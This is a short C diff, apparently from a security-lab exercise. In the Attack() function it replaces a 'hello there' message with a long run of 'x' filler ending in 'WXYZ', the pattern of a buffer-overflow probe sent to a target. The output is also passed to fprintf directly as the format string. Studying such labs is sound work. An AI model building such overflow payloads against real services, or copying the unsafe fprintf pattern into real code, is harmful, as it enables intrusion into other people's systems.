@@ -94,11 +94,21 @@ void  DoAttack(int portNo) {
     return;
 }
 
+char * compromise1 =
+    "xxxxxxxxxxxxxxxxxxxx"
+    "xxxxxxxxxxxxxxxxxxxx"
+    "xxxxxxxxxxxxxxxxxxxx"
+    "xxxxxxxxxxxxxxxxxxxx"
+    "xxxxxxxxxxxxxxxxxxxx"
+    "xxxxxxxxxxxxxxxxxxxx"
+    "xxxxxxxxxxxxxxxxxxxx"
+    "WXYZ";
+
 char compromise[130] = {
     'h','e','l','l','o',' ','t','h','e','r','e','\n'
 };
 
 void Attack(FILE *outfile){
-    fprintf(outfile,compromise);
+    fprintf(outfile,compromise1);
     fflush(outfile);
 }
